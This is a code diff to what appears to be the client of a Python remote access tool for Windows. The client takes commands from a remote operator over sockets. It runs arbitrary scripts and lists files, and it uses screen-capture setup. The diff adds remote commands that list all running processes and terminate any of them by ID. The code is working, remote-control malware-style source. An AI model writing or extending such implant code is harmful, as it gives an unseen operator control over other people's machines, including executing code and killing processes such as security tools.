@@ -22,12 +22,16 @@ __version__ = '1.0'
 __ostype__ = str(sys.platform)
 __os__ = str(platform.platform())
 __user__ = str(platform.node())
+
 # INIT Widnows DLL's
 Kernel32 = ctypes.windll.kernel32
 User32 = ctypes.windll.user32
 Gdi32 = ctypes.windll.gdi32
+Psapi = ctypes.windll.psapi
+
 # INIT Sockets bank
 socketsBank = {}
+
 # INIT Screen*
 hDesktopWnd = User32.GetDesktopWindow()
 left = User32.GetSystemMetrics(76)
@@ -37,6 +41,19 @@ bottom = User32.GetSystemMetrics(79)
 width = right - left
 height = bottom - top
 
+# INIT Processes
+EnumProcesses = Psapi.EnumProcesses
+EnumProcesses.restype = ctypes.wintypes.BOOL
+GetProcessImageFileName = Psapi.GetProcessImageFileNameA
+GetProcessImageFileName.restype = ctypes.wintypes.DWORD
+OpenProcess = Kernel32.OpenProcess
+OpenProcess.restype = ctypes.wintypes.HANDLE
+TerminateProcess = Kernel32.TerminateProcess
+TerminateProcess.restype = ctypes.wintypes.BOOL
+CloseHandle = Kernel32.CloseHandle
+MAX_PATH = 260
+PROCESS_TERMINATE = 0x0001
+PROCESS_QUERY_INFORMATION = 0x0400
 
 class BITMAPFILEHEADER(ctypes.Structure):
     _fields_ = [
@@ -117,7 +134,7 @@ def get_fptr(fn):
 
 def send(sock, _data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
     msg = (_data + end).encode('utf-8')
-    size = sys.getsizeof(msg)
+    size = len(msg)
     msg = mode + splitter + msg
     sock.sendall(str(size) + '%:::%' + msg)
 
@@ -272,6 +289,28 @@ def get_window_title():
     get_window_text(hwnd, buff, length + 1)
     return buff.value
 
+def get_processes_list():
+    PROCESSES = {}
+    max_array = ctypes.c_ulong * 4096
+    pProcessIds = max_array()
+    pBytesReturned = ctypes.c_ulong()
+    Psapi.EnumProcesses(ctypes.byref(pProcessIds), ctypes.sizeof(pProcessIds), ctypes.byref(pBytesReturned))
+    nReturned = pBytesReturned.value/ctypes.sizeof(ctypes.c_ulong())
+    pidProcessArray = [i for i in pProcessIds][:nReturned]
+    for ProcessId in pidProcessArray:
+        hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, ProcessId)
+        if hProcess:
+            ImageFileName = (ctypes.c_char*MAX_PATH)()
+            if GetProcessImageFileName(hProcess, ImageFileName, MAX_PATH)>0:
+                filename = os.path.basename(ImageFileName.value)
+                PROCESSES[ProcessId] = filename
+            CloseHandle(hProcess)
+    return str(PROCESSES)
+
+def terminateProcess(PID):
+    hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, PID)
+    TerminateProcess(hProcess, 1)
+    return 'processTerminated'
 
 class ChildSocket(threading.Thread):
     def __init__(self, id, mode):
@@ -346,8 +385,10 @@ class ChildSocket(threading.Thread):
                         stdoutput = ""
                     except:
                         stdoutput = "Error opening directory"
-                elif data.startswith('Activate'):
-                    stdoutput = ''
+                elif data.startswith('getProcessesList'):
+                    stdoutput = get_processes_list()
+                elif data.startswith('terminateProcess'):
+                    stdoutput = terminateProcess(int(data.split(' ')[1]))
                 elif data.startswith('runscript '):
                     stdoutput = execute(data[10:])
                 elif data.startswith('ls'):
